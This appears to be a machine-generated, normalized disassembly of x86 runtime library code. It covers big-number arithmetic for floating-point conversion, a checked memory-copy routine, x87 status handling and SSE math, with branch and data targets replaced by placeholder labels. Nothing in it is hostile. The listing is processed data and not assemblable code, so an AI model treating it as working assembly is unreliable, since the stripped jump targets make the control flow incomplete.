mov ebx [ ebp - 0x1d4 ]
mov edi [ ebp - 0x754 ]
mov [ ebp - 0x74c ] edi
test ebx ebx
je r-xdata
mov edi [ ecx * 4 + r--data ]
test edi edi
je r-xdata
cmp [ ebp - 0x1d4 ] 0x1
ja r-xdata
mov edi [ ebp - 0x3a0 ]
test edi edi
jne r-xdata
mov edi [ edi * 4 + r--data ]
test edi edi
jne r-xdata
cmp [ ebp - 0x574 ] 0x1
ja r-xdata
mov edi [ ebp - 0x3a0 ]
test edi edi
jne r-xdata
mov [ ebp - 0x1d4 ] eax
jmp r-xdata
inc eax
mov [ ebp - 0x750 ] 0x0
mov ecx [ esi ]
mov [ ebp - 0x750 ] ecx
jmp r-xdata
xor ecx ecx
mov ecx [ esi - 0x4 ]
jmp r-xdata
lea eax [ edx - 0x1 ]
cmp eax ebx
jae r-xdata
cmp [ ebp - 0x745 ] 0x0
je r-xdata
mov ecx eax
lea edi [ ebp - 0x1d0 ]
xor eax eax
[ edi ]
mov edx [ ebp - 0x75c ]
cmp esi ebx
jae r-xdata
mov edx 0x72
cmp ecx edx
cmovb edx ecx
mov [ ebp - 0x760 ] edx
mov edi edx
cmp edx 0xffffffff
je r-xdata
test dh dh
jne r-xdata
lea eax [ ebp - 0x574 ]
push eax
lea eax [ ebp - 0x1d4 ]
push eax
call sub_441440
mov ebx [ ebp - 0x764 ]
add esp 0x8
cmp eax 0xa
jne r-xdata
xor esi esi
mov edi 0xa
xor ecx ecx
mov edi edi
lea eax [ ebp - 0x3a0 ]
mov [ ebp - 0x1d4 ] 0x0
push 0x0
push eax
lea eax [ ebp - 0x1d0 ]
cmp edi 0x1
je r-xdata
mov esi [ ebp - 0x1d4 ]
cmp ecx esi
mov [ ebp - 0x74c ] esi
setb al
test al al
je r-xdata
mov edi [ ebp - 0x1d0 ]
lea eax [ ecx * 4 ]
push eax
lea eax [ ebp - 0x3a0 ]
mov [ ebp - 0x1d4 ] ecx
push eax
lea eax [ ebp - 0x1d0 ]
push 0x1cc
push eax
call sub_443b14
add esp 0x10
test edi edi
jne r-xdata
cmp edi 0x1
je r-xdata
mov [ ebp - 0x744 ] edi
lea eax [ ebp - 0x740 ]
cmp edi 0x1
je r-xdata
lea eax [ ebp - 0x3a0 ]
mov [ ebp - 0x574 ] 0x0
push 0x0
push eax
lea eax [ ebp - 0x570 ]
jmp r-xdata
mov esi [ ebp - 0x574 ]
cmp ecx esi
mov [ ebp - 0x74c ] esi
setb al
test al al
je r-xdata
mov edi [ ebp - 0x570 ]
lea eax [ ecx * 4 ]
push eax
lea eax [ ebp - 0x3a0 ]
mov [ ebp - 0x574 ] ecx
push eax
lea eax [ ebp - 0x570 ]
push 0x1cc
push eax
call sub_443b14
add esp 0x10
test edi edi
jne r-xdata
cmp edi 0x1
je r-xdata
mov [ ebp - 0x744 ] edi
lea eax [ ebp - 0x740 ]
mov edi 0x1
lea eax [ ebp - 0x3a0 ]
sub edi esi
mov ebx edi
shr ebx 0x5
lea esi [ ebx * 4 ]
push esi
push 0x0
push eax
call sub_40de60
and edi 0x1f
mov eax 0x1
mov ecx edi
shl eax cl
mov [ ebp + esi - 0x3a0 ] eax
xor ecx ecx
mov ecx [ esi - 0x4 ]
jmp r-xdata
lea eax [ edx - 0x1 ]
cmp eax ebx
jae r-xdata
xor eax eax
mov edi 0x2
cmp [ ebp - 0x745 ] al
setne al
sub edi [ ebp - 0x74c ]
mov ebx edi
add eax 0x2
shr ebx 0x5
mov [ ebp - 0x1d4 ] eax
lea eax [ ebp - 0x3a0 ]
lea esi [ ebx * 4 ]
push esi
push 0x0
push eax
call sub_40de60
and edi 0x1f
mov eax 0x1
mov ecx edi
shl eax cl
mov [ ebp + esi - 0x3a0 ] eax
jmp r-xdata
mov ebx [ ebp - 0x1d4 ]
jmp r-xdata
shr ecx 0x1e
lea eax [ edi * 4 ]
xor ecx eax
dec edx
mov eax [ ebp - 0x750 ]
sub esi 0x4
mov [ eax ] ecx
sub eax 0x4
mov [ ebp - 0x750 ] eax
cmp edx 0xffffffff
je r-xdata
mov [ ebp - 0x1d4 ] edx
mov [ ebp - 0x3a0 ] 0x2
jmp r-xdata
lea eax [ edx + 0x1 ]
mov [ ebp - 0x3a0 ] 0x2
mov [ ebp - 0x1d4 ] eax
jmp r-xdata
xor edx edx
mov edx [ ecx ]
jmp r-xdata
test eax eax
je r-xdata
mov esi edx
lea ecx [ ebp - 0x1d0 ]
sub esi eax
lea ecx [ ecx + esi * 4 ]
mov [ ebp - 0x750 ] ecx
test eax eax
jne r-xdata
lea edx [ edi + 0x1 ]
mov [ edi ] 0x31
mov edi [ ebp - 0x574 ]
inc ebx
mov [ ebp - 0x764 ] ebx
mov [ ebp - 0x74c ] edx
test edi edi
je r-xdata
mov eax [ ebp + ecx * 4 - 0x1d0 ]
mul edi
add eax esi
mov [ ebp + ecx * 4 - 0x1d0 ] eax
adc edx 0x0
inc ecx
mov esi edx
cmp ecx ebx
jne r-xdata
mov edi [ ebp - 0x754 ]
test esi esi
je r-xdata
mov ebx [ ebp - 0x1d4 ]
test ebx ebx
je r-xdata
lea eax [ ebp - 0x3a0 ]
mov [ ebp - 0x74c ] ecx
mov [ ebp - 0x750 ] eax
lea esi [ ebp - 0x1d0 ]
mov eax [ ebp - 0x1d4 ]
lea eax [ ebp - 0x1d0 ]
mov [ ebp - 0x750 ] eax
lea esi [ ebp - 0x3a0 ]
mov eax ecx
jmp r-xdata
cmp edi 0x1
je r-xdata
mov [ ebp - 0x3a4 ] edi
lea eax [ ebp - 0x3a0 ]
jmp r-xdata
mov al 0x1
cmp [ ebp - 0x1d4 ] 0x0
je r-xdata
mov ebx [ ebp - 0x574 ]
test ebx ebx
je r-xdata
push 0x1cc
push eax
mov [ ebp - 0x3a4 ] 0x0
call sub_443b14
add esp 0x10
lea eax [ ebp - 0x3a0 ]
mov [ ebp - 0x74c ] ecx
mov [ ebp - 0x750 ] eax
lea esi [ ebp - 0x570 ]
mov eax [ ebp - 0x574 ]
lea eax [ ebp - 0x570 ]
mov [ ebp - 0x750 ] eax
lea esi [ ebp - 0x3a0 ]
mov eax ecx
jmp r-xdata
cmp edi 0x1
je r-xdata
mov [ ebp - 0x3a4 ] edi
lea eax [ ebp - 0x3a0 ]
jmp r-xdata
mov al 0x1
cmp [ ebp - 0x574 ] 0x0
je r-xdata
mov eax [ ebp - 0x760 ]
mov esi [ ebp - 0x74c ]
mov ebx [ ebp - 0x1d4 ]
jmp r-xdata
mov eax [ ebp - 0x750 ]
dec edx
shr ecx 0x1f
add eax eax
xor ecx eax
sub esi 0x4
mov [ edi ] ecx
sub edi 0x4
cmp edx 0xffffffff
je r-xdata
lea eax [ ebx + 0x1 ]
mov [ ebp - 0x3a4 ] eax
mov [ ebp - 0x574 ] eax
shl eax 0x2
push eax
lea eax [ ebp - 0x3a0 ]
push eax
lea eax [ ebp - 0x570 ]
push 0x1cc
push eax
call sub_443b14
add esp 0x1c
cmp edx ebx
jae r-xdata
xor eax eax
mov eax [ ecx - 0x4 ]
jmp r-xdata
lea eax [ esi - 0x1 ]
cmp eax ebx
jae r-xdata
cmp [ ebp - 0x745 ] 0x0
je r-xdata
mov ecx eax
lea edi [ ebp - 0x1d0 ]
xor eax eax
[ edi ]
mov edx [ ebp - 0x760 ]
cmp esi ebx
jae r-xdata
add al 0x30
lea edx [ edi + 0x1 ]
mov [ edi ] al
mov [ ebp - 0x74c ] edx
jmp r-xdata
mov edx [ ebp - 0x74c ]
dec ebx
jmp r-xdata
mov edi [ ebp - 0x754 ]
xor esi esi
mov ebx eax
xor ecx ecx
lea esp [ esp ]
mov eax [ ebp - 0x1d4 ]
cmp eax 0x73
jae r-xdata
xor esi esi
xor ecx ecx
lea esp [ esp ]
mov [ ebp - 0x1d4 ] edx
shl edx 0x2
test edx edx
je r-xdata
lea eax [ ebp - 0x740 ]
sub esi eax
mov [ ebp - 0x760 ] esi
jmp r-xdata
xor edx edx
mov [ ebp - 0x758 ] eax
xor ebx ebx
mov [ ebp - 0x744 ] edx
test eax eax
je r-xdata
cmp [ ebp - 0x1d4 ] 0x0
je r-xdata
push 0x0
push eax
lea eax [ ebp - 0x1d0 ]
mov [ ebp - 0x1d4 ] 0x0
push 0x1cc
push eax
call sub_443b14
add esp 0x10
jmp r-xdata
mov eax [ ebp - 0x75c ]
mov ecx 0x26
sub eax [ ebp - 0x76c ]
mov [ ebp - 0x75c ] eax
jne r-xdata
mov ebx [ ebp - 0x1d4 ]
xor esi esi
xor ecx ecx
xor esi esi
xor ecx ecx
jmp r-xdata
mov [ ebp - 0x574 ] edx
shl edx 0x2
test edx edx
je r-xdata
lea eax [ ebp - 0x740 ]
sub esi eax
mov [ ebp - 0x76c ] esi
jmp r-xdata
xor edx edx
mov [ ebp - 0x758 ] eax
xor ebx ebx
mov [ ebp - 0x744 ] edx
test eax eax
je r-xdata
cmp [ ebp - 0x574 ] 0x0
je r-xdata
push 0x0
push eax
lea eax [ ebp - 0x570 ]
mov [ ebp - 0x574 ] 0x0
push 0x1cc
push eax
call sub_443b14
add esp 0x10
jmp r-xdata
mov eax [ ebp - 0x75c ]
mov ecx 0x26
sub eax [ ebp - 0x768 ]
mov [ ebp - 0x75c ] eax
jne r-xdata
mov ebx [ ebp - 0x574 ]
xor esi esi
xor ecx ecx
jmp r-xdata
cmp edx ebx
jae r-xdata
mov ebx [ ebp - 0x1d4 ]
jmp r-xdata
and eax [ ebp - 0x760 ]
dec esi
mov ecx [ ebp - 0x76c ]
and edx [ ebp - 0x768 ]
shr eax cl
mov ecx [ ebp - 0x758 ]
shl edx cl
mov ecx [ ebp - 0x750 ]
or eax edx
mov [ ebp + edi * 4 - 0x1d0 ] eax
sub ecx 0x4
mov eax [ ebp - 0x74c ]
dec edi
mov [ ebp - 0x750 ] ecx
cmp edi 0xffffffff
je r-xdata
mov [ ebp - 0x1d4 ] edx
jmp r-xdata
lea eax [ edx + 0x1 ]
mov [ ebp - 0x1d4 ] eax
jmp r-xdata
xor edx edx
mov edx [ ecx ]
jmp r-xdata
mov eax [ ebp - 0x77c ]
mov ecx [ ebp - 0x770 ]
mov [ eax + 0x4 ] ebx
test ebx ebx
js r-xdata
mov eax [ ebp + 0x1c ]
dec eax
cmp eax ecx
jb r-xdata
cmp ecx 0x7fffffff
ja r-xdata
mov eax [ ebp + ecx * 4 - 0x570 ]
mul ebx
add eax esi
mov [ ebp + ecx * 4 - 0x570 ] eax
adc edx 0x0
inc ecx
mov esi edx
cmp ecx edi
jne r-xdata
mov ebx [ ebp - 0x764 ]
test esi esi
je r-xdata
push 0x0
lea eax [ ebp - 0x3a0 ]
mov [ ebp - 0x3a4 ] 0x0
push eax
lea eax [ ebp - 0x1d0 ]
mov [ ebp - 0x1d4 ] 0x0
push 0x1cc
push eax
call sub_443b14
add esp 0x10
mov [ ebp + eax * 4 - 0x1d0 ] esi
inc [ ebp - 0x1d4 ]
jmp r-xdata
mov eax edi
mul [ ebp + ecx * 4 - 0x1d0 ]
add eax esi
mov [ ebp + ecx * 4 - 0x1d0 ] eax
adc edx 0x0
inc ecx
mov esi edx
cmp ecx ebx
jne r-xdata
test esi esi
je r-xdata
cmp edx 0x1cc
ja r-xdata
lea eax [ esi + ebx * 4 ]
mov eax [ ebp + eax - 0x740 ]
mov [ ebp - 0x780 ] eax
test eax eax
jne r-xdata
mov ebx [ ebp - 0x1d4 ]
xor esi esi
xor ecx ecx
jmp r-xdata
cmp eax 0x26
mov ebx eax
cmova ebx ecx
mov [ ebp - 0x76c ] ebx
movzx ecx [ ebx * 4 + r--data ]
movzx esi [ ebx * 4 + r--data ]
lea edi [ ecx * 4 ]
lea eax [ ecx + esi ]
push edi
mov [ ebp - 0x3a4 ] eax
lea eax [ ebp - 0x3a0 ]
push 0x0
push eax
call sub_40de60
lea eax [ esi * 4 ]
push eax
movzx eax [ ebx * 4 + r--data ]
lea eax [ eax * 4 + r--data ]
push eax
lea eax [ ebp - 0x3a0 ]
add eax edi
push eax
call sub_40d8e0
mov ecx [ ebp - 0x3a4 ]
add esp 0x18
cmp ecx 0x1
ja r-xdata
mov ecx [ ebp - 0x768 ]
mov edx [ ebp - 0x774 ]
mov eax edi
mul [ ebp + ecx * 4 - 0x1d0 ]
add eax esi
mov [ ebp + ecx * 4 - 0x1d0 ] eax
adc edx 0x0
inc ecx
mov esi edx
cmp ecx ebx
jne r-xdata
test esi esi
je r-xdata
mov eax edi
mul [ ebp + ecx * 4 - 0x570 ]
add eax esi
mov [ ebp + ecx * 4 - 0x570 ] eax
adc edx 0x0
inc ecx
mov esi edx
cmp ecx ebx
jne r-xdata
cmp edx 0x1cc
ja r-xdata
lea eax [ esi + ebx * 4 ]
mov eax [ ebp + eax - 0x740 ]
mov [ ebp - 0x760 ] eax
test eax eax
jne r-xdata
mov ebx [ ebp - 0x574 ]
xor esi esi
xor ecx ecx
lea ebx [ ebx ]
cmp eax 0x26
mov ebx eax
cmova ebx ecx
mov [ ebp - 0x768 ] ebx
movzx ecx [ ebx * 4 + r--data ]
movzx esi [ ebx * 4 + r--data ]
lea edi [ ecx * 4 ]
lea eax [ ecx + esi ]
push edi
mov [ ebp - 0x3a4 ] eax
lea eax [ ebp - 0x3a0 ]
push 0x0
push eax
call sub_40de60
lea eax [ esi * 4 ]
push eax
movzx eax [ ebx * 4 + r--data ]
lea eax [ eax * 4 + r--data ]
push eax
lea eax [ ebp - 0x3a0 ]
add eax edi
push eax
call sub_40d8e0
mov ecx [ ebp - 0x3a4 ]
add esp 0x18
cmp ecx 0x1
ja r-xdata
mov ecx [ ebp - 0x780 ]
mov eax edi
mul [ ebp + ecx * 4 - 0x570 ]
add eax esi
mov [ ebp + ecx * 4 - 0x570 ] eax
adc edx 0x0
inc ecx
mov esi edx
cmp ecx ebx
jne r-xdata
cmp edi eax
jb r-xdata
mov [ ebp - 0x3a0 ] 0x4
xor eax eax
mov eax [ ecx - 0x4 ]
jmp r-xdata
lea eax [ esi - 0x1 ]
cmp eax ebx
jae r-xdata
add eax edi
mov [ ebp - 0x770 ] eax
cmp edx eax
je r-xdata
mov eax ecx
add ecx ebx
mov edx [ ebp - 0x74c ]
mov eax [ ebp - 0x574 ]
cmp eax 0x73
jae r-xdata
mov eax [ ebp - 0x1d4 ]
cmp eax 0x73
jae r-xdata
push 0x1cc
lea eax [ ebp - 0x1d0 ]
push 0x0
push eax
call sub_40de60
add esp 0xc
call sub_42fef5
mov [ eax ] 0x22
call sub_42fdcf
push edx
lea eax [ ebp - 0x740 ]
push eax
lea eax [ ebp - 0x1d0 ]
push eax
call sub_40d8e0
add esp 0xc
jmp r-xdata
xor esi esi
xor edi edi
mov ecx ebx
cmp [ ebp - 0x74c ] esi
je r-xdata
cmp ebx edx
jne r-xdata
mov eax edi
mul [ ebp + ecx * 4 - 0x1d0 ]
add eax esi
mov [ ebp + ecx * 4 - 0x1d0 ] eax
adc edx 0x0
inc ecx
mov esi edx
cmp ecx ebx
jne r-xdata
mov eax [ ebp - 0x1d4 ]
cmp eax 0x73
jae r-xdata
test esi esi
je r-xdata
push 0x1cc
lea eax [ ebp - 0x570 ]
push 0x0
push eax
call sub_40de60
add esp 0xc
call sub_42fef5
mov [ eax ] 0x22
call sub_42fdcf
push edx
lea eax [ ebp - 0x740 ]
push eax
lea eax [ ebp - 0x570 ]
push eax
call sub_40d8e0
add esp 0xc
jmp r-xdata
xor esi esi
xor edi edi
mov ecx ebx
cmp [ ebp - 0x74c ] esi
je r-xdata
cmp ebx edx
jne r-xdata
mov eax edi
mul [ ebp + ecx * 4 - 0x570 ]
add eax esi
mov [ ebp + ecx * 4 - 0x570 ] eax
adc edx 0x0
inc ecx
mov esi edx
cmp ecx ebx
jne r-xdata
test esi esi
je r-xdata
test esi esi
je r-xdata
mov ebx [ ebp - 0x1d4 ]
jmp r-xdata
and eax [ ebp - 0x768 ]
dec esi
mov ecx [ ebp - 0x75c ]
and edx [ ebp - 0x76c ]
shr eax cl
mov ecx [ ebp - 0x758 ]
shl edx cl
mov ecx [ ebp - 0x750 ]
or eax edx
mov [ ebp + edi * 4 - 0x1d0 ] eax
sub ecx 0x4
mov eax [ ebp - 0x74c ]
dec edi
mov [ ebp - 0x750 ] ecx
cmp edi 0xffffffff
je r-xdata
mov [ edx ] 0x0
mov ebx 0x3b9aca00
push 0x0
lea eax [ ebp - 0x3a0 ]
mov [ ebp - 0x3a4 ] 0x0
push eax
lea eax [ ebp - 0x570 ]
mov [ ebp - 0x574 ] 0x0
push 0x1cc
push eax
call sub_443b14
add esp 0x10
jmp r-xdata
mov [ ebp + eax * 4 - 0x570 ] esi
inc [ ebp - 0x574 ]
mov [ ebp + eax * 4 - 0x1d0 ] esi
inc [ ebp - 0x1d4 ]
jmp r-xdata
cmp ecx 0x73
je r-xdata
cmp ecx 0x73
je r-xdata
inc ebx
cmp ebx [ ebp - 0x758 ]
jne r-xdata
lea edx [ ebx + 0x1 ]
mov [ ebp + ebx * 4 - 0x740 ] eax
mov [ ebp - 0x744 ] edx
jmp r-xdata
test esi esi
je r-xdata
push 0x0
lea eax [ ebp - 0x3a0 ]
mov [ ebp - 0x3a4 ] 0x0
push eax
lea eax [ ebp - 0x1d0 ]
mov [ ebp - 0x1d4 ] 0x0
push 0x1cc
push eax
call sub_443b14
add esp 0x10
xor al al
jmp r-xdata
mov [ ebp + eax * 4 - 0x1d0 ] esi
inc [ ebp - 0x1d4 ]
jmp r-xdata
mov eax [ ebp - 0x574 ]
cmp eax 0x73
jae r-xdata
cmp ecx 0x73
je r-xdata
cmp ecx 0x73
je r-xdata
inc ebx
cmp ebx [ ebp - 0x758 ]
jne r-xdata
lea edx [ ebx + 0x1 ]
mov [ ebp + ebx * 4 - 0x740 ] eax
mov [ ebp - 0x744 ] edx
jmp r-xdata
mov eax [ ebp - 0x574 ]
cmp eax 0x73
jae r-xdata
mov eax [ ebp - 0x574 ]
cmp eax 0x73
jae r-xdata
cmp edi eax
jb r-xdata
mov eax [ rw-data ]
or eax 0x1
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
jmp r-xdata
mov [ ebp - 0x1d4 ] 0x0
xor al al
jmp r-xdata
mov esi [ ebp - 0x760 ]
test esi esi
je r-xdata
cmp ecx edx
jne r-xdata
mov eax [ ebp - 0x1d4 ]
cmp eax 0x73
jae r-xdata
test al al
je r-xdata
mov [ ebp + eax * 4 - 0x570 ] esi
inc [ ebp - 0x574 ]
jmp r-xdata
mov [ ebp - 0x574 ] 0x0
xor al al
jmp r-xdata
mov esi [ ebp - 0x76c ]
test esi esi
je r-xdata
cmp ecx edx
jne r-xdata
push 0x0
lea eax [ ebp - 0x3a0 ]
mov [ ebp - 0x3a4 ] 0x0
push eax
lea eax [ ebp - 0x570 ]
mov [ ebp - 0x574 ] 0x0
push 0x1cc
push eax
call sub_443b14
add esp 0x10
xor al al
jmp r-xdata
mov [ ebp + eax * 4 - 0x570 ] esi
inc [ ebp - 0x574 ]
jmp r-xdata
mov [ ebp + eax * 4 - 0x570 ] esi
inc [ ebp - 0x574 ]
jmp r-xdata
test esi esi
je r-xdata
xor ecx ecx
test esi esi
je r-xdata
mov esi [ ebp - 0x1d4 ]
cmp esi eax
jne r-xdata
lea ecx [ ecx ]
mov eax [ ebp - 0x750 ]
mov eax [ eax + edi * 4 ]
mul [ ebp - 0x780 ]
add eax esi
adc edx 0x0
add eax [ ebp + ecx * 4 - 0x740 ]
mov [ ebp + ecx * 4 - 0x740 ] eax
adc edx 0x0
inc edi
inc ecx
mov esi edx
mov edx [ ebp - 0x744 ]
cmp edi [ ebp - 0x74c ]
jne r-xdata
lea eax [ ebx + 0x1 ]
mov [ ebp + ecx * 4 - 0x740 ] 0x0
add eax edi
mov [ ebp - 0x744 ] eax
mov [ ebp + eax * 4 - 0x1d0 ] esi
inc [ ebp - 0x1d4 ]
jmp r-xdata
test al al
je r-xdata
lea ecx [ ecx ]
mov eax [ ebp - 0x750 ]
mov eax [ eax + edi * 4 ]
mul [ ebp - 0x760 ]
add eax esi
adc edx 0x0
add eax [ ebp + ecx * 4 - 0x740 ]
mov [ ebp + ecx * 4 - 0x740 ] eax
adc edx 0x0
inc edi
inc ecx
mov esi edx
mov edx [ ebp - 0x744 ]
cmp edi [ ebp - 0x74c ]
jne r-xdata
lea eax [ ebx + 0x1 ]
mov [ ebp + ecx * 4 - 0x740 ] 0x0
add eax edi
mov [ ebp - 0x744 ] eax
lea eax [ ebp - 0x574 ]
push eax
lea eax [ ebp - 0x1d4 ]
push eax
call sub_441440
mov edi [ ebp - 0x770 ]
add esp 0x8
sub edi [ ebp - 0x74c ]
mov ebx eax
mov esi 0x8
xor edi edi
xor ecx ecx
jmp r-xdata
cmp ecx edx
jne r-xdata
cmp ecx edx
jne r-xdata
dec esi
cmp esi 0xffffffff
jne r-xdata
mov [ esi + edx ] al
mov eax [ ebp + ecx * 4 - 0x1d0 ]
mul ebx
add eax edi
mov [ ebp + ecx * 4 - 0x1d0 ] eax
adc edx 0x0
inc ecx
mov edi edx
cmp ecx esi
jne r-xdata
test edi edi
je r-xdata
mov eax [ ebp + ecx * 4 - 0x1d0 ]
cmp eax [ ecx * 4 + rw-data ]
jne r-xdata
mov eax esi
xor esi esi
add eax [ ebp + ecx * 4 - 0x740 ]
mov [ ebp + ecx * 4 - 0x740 ] eax
mov edx [ ebp - 0x744 ]
adc esi esi
inc ecx
test esi esi
jne r-xdata
lea eax [ ecx + 0x1 ]
mov [ ebp + ecx * 4 - 0x740 ] 0x0
mov [ ebp - 0x744 ] eax
mov eax esi
xor esi esi
add eax [ ebp + ecx * 4 - 0x740 ]
mov [ ebp + ecx * 4 - 0x740 ] eax
mov edx [ ebp - 0x744 ]
adc esi esi
inc ecx
test esi esi
jne r-xdata
lea eax [ ecx + 0x1 ]
mov [ ebp + ecx * 4 - 0x740 ] 0x0
mov [ ebp - 0x744 ] eax
mov eax 0xcccccccd
mul ebx
shr edx 0x3
mov al dl
shl al 0x2
lea ecx [ eax + edx ]
add cl cl
sub bl cl
lea eax [ ebx + 0x30 ]
mov ebx edx
mov edx [ ebp - 0x74c ]
cmp edi esi
jb r-xdata
cmp edi 0x9
jbe r-xdata
mov eax [ ebp - 0x1d4 ]
cmp eax 0x73
jae r-xdata
inc ecx
cmp ecx esi
jne r-xdata
cmp ecx 0x73
je r-xdata
cmp ecx 0x73
je r-xdata
add edx edi
mov ebx 0x3b9aca00
mov [ ebp - 0x74c ] edx
cmp edx [ ebp - 0x770 ]
jne r-xdata
mov edi 0x9
push 0x0
lea eax [ ebp - 0x3a0 ]
mov [ ebp - 0x3a4 ] 0x0
push eax
lea eax [ ebp - 0x1d0 ]
mov [ ebp - 0x1d4 ] 0x0
push 0x1cc
push eax
call sub_443b14
add esp 0x10
mov [ ebp + eax * 4 - 0x1d0 ] edi
inc [ ebp - 0x1d4 ]
jmp r-xdata
jmp r-xdata
mov eax [ rw-data ]
test al 0x1
jne r-xdata
sub_443b14
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x14 ]
test esi esi
jne r-xdata
mov eax [ ebp + 0x8 ]
test eax eax
jne r-xdata
xor eax eax
jmp r-xdata
push edi
mov edi [ ebp + 0x10 ]
test edi edi
je r-xdata
call sub_42fef5
push 0x16
pop esi
mov [ eax ] esi
call sub_42fdcf
mov eax esi
jmp r-xdata
pop esi
pop ebp
retn
push [ ebp + 0xc ]
push 0x0
push eax
call sub_40de60
add esp 0xc
test edi edi
jne r-xdata
cmp [ ebp + 0xc ] esi
jb r-xdata
cmp [ ebp + 0xc ] esi
jae r-xdata
call sub_42fef5
push 0x16
jmp r-xdata
push esi
push edi
push eax
call sub_40d8e0
add esp 0xc
xor eax eax
jmp r-xdata
push 0x16
pop eax
call sub_42fef5
push 0x22
pop esi
mov [ eax ] esi
call sub_42fdcf
mov eax esi
jmp r-xdata
pop edi
sub_443ba0
cmp [ edx + 0xe ] 0x5
jne r-xdata
mov bx 0x133f
mov bx [ ebp - 0xa4 ]
or bh 0x2
and bh 0xfe
mov bl 0x3f
jmp r-xdata
mov [ ebp - 0xa2 ] bx
fldcw [ ebp - 0xa2 ]
mov ebx r--data
fxam
mov [ ebp - 0x94 ] edx
fwait
fnstsw [ ebp - 0xa0 ]
mov [ ebp - 0x90 ] 0x0
fwait
mov cl [ ebp - 0x9f ]
shl cl 0x1
sar cl 0x1
rol cl 0x1
mov al cl
and al 0xf
xlat
movsx eax al
and ecx 0x404
mov ebx edx
add ebx eax
add ebx 0x10
jmp [ ebx ]
sub_443c07
cmp [ edx + 0xe ] 0x5
jne r-xdata
mov bx 0x133f
mov bx [ ebp - 0xa4 ]
or bh 0x2
and bh 0xfe
mov bl 0x3f
jmp r-xdata
mov [ ebp - 0xa2 ] bx
fldcw [ ebp - 0xa2 ]
mov ebx r--data
fxam
mov [ ebp - 0x94 ] edx
fwait
fnstsw [ ebp - 0xa0 ]
mov [ ebp - 0x90 ] 0x0
fxch st1
mov cl [ ebp - 0x9f ]
fxam
fwait
fnstsw [ ebp - 0xa0 ]
fxch st1
mov ch [ ebp - 0x9f ]
shl ch 0x1
sar ch 0x1
rol ch 0x1
mov al ch
and al 0xf
xlat
mov ah al
shl cl 0x1
sar cl 0x1
rol cl 0x1
mov al cl
and al 0xf
xlat
shl ah 0x1
shl ah 0x1
or al ah
movsx eax al
and ecx 0x404
mov ebx edx
add ebx eax
add ebx 0x10
jmp [ ebx ]
sub_443d14
fstp [ ebp - 0x9e ]
fld [ ebp - 0x9e ]
test [ ebp - 0x97 ] 0x40
je r-xdata
mov [ ebp - 0x90 ] 0x1
fxch st1
fstp [ ebp - 0x9e ]
fld [ ebp - 0x9e ]
test [ ebp - 0x97 ] 0x40
je r-xdata
mov [ ebp - 0x90 ] 0x0
jmp r-xdata
faddp st1
retn
sub_443da9
mov edi edi
push ebx
mov ebx esp
push ecx
push ecx
and esp 0xfffffff0
add esp 0x4
push ebp
mov ebp [ ebx + 0x4 ]
mov [ esp + 0x4 ] ebp
mov ebp esp
sub esp 0x88
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebx + 0x10 ]
push esi
mov esi [ ebx + 0xc ]
push edi
movzx ecx [ eax ]
mov [ ebp - 0x84 ] ecx
mov eax [ esi ]
sub eax 0x1
je r-xdata
push 0x8
sub eax 0x1
je r-xdata
mov ecx [ ebp - 0x84 ]
mov ecx [ ebx + 0x8 ]
cmp ecx 0x10
je r-xdata
push 0x4
jmp r-xdata
sub eax 0x1
je r-xdata
push [ esi ]
call sub_44777b
pop ecx
call sub_429cbe
test al al
je r-xdata
mov eax [ ebp - 0x40 ]
fld [ esi + 0x10 ]
and eax 0xffffffe3
or eax 0x3
fstp [ ebp - 0x50 ]
mov [ ebp - 0x40 ] eax
cmp ecx 0x16
je r-xdata
pop edi
push ecx
lea eax [ esi + 0x18 ]
push eax
push edi
call sub_447257
add esp 0xc
test eax eax
jne r-xdata
push 0x11
jmp r-xdata
sub eax 0x1
je r-xdata
push esi
call sub_429ceb
pop ecx
test eax eax
jne r-xdata
cmp ecx 0x1d
je r-xdata
push 0x12
jmp r-xdata
sub eax 0x1
je r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
xor ecx ebp
pop esi
call sub_40c3ae
mov esp ebp
pop ebp
mov esp ebx
pop ebx
retn
and [ ebp - 0x40 ] 0xfffffffe
jmp r-xdata
sub eax 0x3
jne r-xdata
lea eax [ esi + 0x18 ]
push eax
lea eax [ esi + 0x8 ]
push eax
push ecx
push edi
lea eax [ ebp - 0x84 ]
push eax
lea eax [ ebp - 0x80 ]
push eax
call sub_447444
add esp 0x18
push 0xffff
push ecx
call sub_445b6f
cmp [ esi ] 0x8
pop ecx
pop ecx
je r-xdata
push 0x10
jmp r-xdata
sub_443ec3
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
xor ecx ecx
cmp [ rw-data ] 0x1
setge cl
neg eax
sbb eax eax
and eax ecx
mov [ rw-data ] eax
pop ebp
retn
sub_443f1e
pextrw eax xmm0 0x3
and ax 0x7fff
sub ax 0x3030
cmp ax 0x10c5
ja r-xdata
jg r-xdata
movlpd xmm1 [ r--data ]
mulsd xmm1 xmm0
movlpd xmm2 [ r--data ]
cvtsd2si edx xmm1
addsd xmm1 xmm2
movlpd xmm3 [ r--data ]
subsd xmm1 xmm2
movapd xmm2 [ r--data ]
mulsd xmm3 xmm1
unpcklpd xmm1 xmm1
add edx 0x1c7610
movsd xmm4 xmm0
and edx 0x3f
movapd xmm5 [ r--data ]
lea eax [ r--data ]
shl edx 0x5
add eax edx
mulpd xmm2 xmm1
subsd xmm0 xmm3
mulsd xmm1 [ r--data ]
subsd xmm4 xmm3
movlpd xmm7 [ eax + 0x8 ]
unpcklpd xmm0 xmm0
movsd xmm3 xmm4
subsd xmm4 xmm2
mulpd xmm5 xmm0
subpd xmm0 xmm2
movapd xmm6 [ r--data ]
mulsd xmm7 xmm4
subsd xmm3 xmm4
mulpd xmm5 xmm0
mulpd xmm0 xmm0
subsd xmm3 xmm2
movapd xmm2 [ eax ]
subsd xmm1 xmm3
movlpd xmm3 [ eax + 0x18 ]
addsd xmm2 xmm3
subsd xmm7 xmm2
mulsd xmm2 xmm4
mulpd xmm6 xmm0
mulsd xmm3 xmm4
mulpd xmm2 xmm0
mulpd xmm0 xmm0
addpd xmm5 [ r--data ]
mulsd xmm4 [ eax ]
addpd xmm6 [ r--data ]
mulpd xmm5 xmm0
movsd xmm0 xmm3
addsd xmm3 [ eax + 0x8 ]
mulsd xmm1 xmm7
movsd xmm7 xmm4
addsd xmm4 xmm3
addpd xmm6 xmm5
movlpd xmm5 [ eax + 0x8 ]
subsd xmm5 xmm3
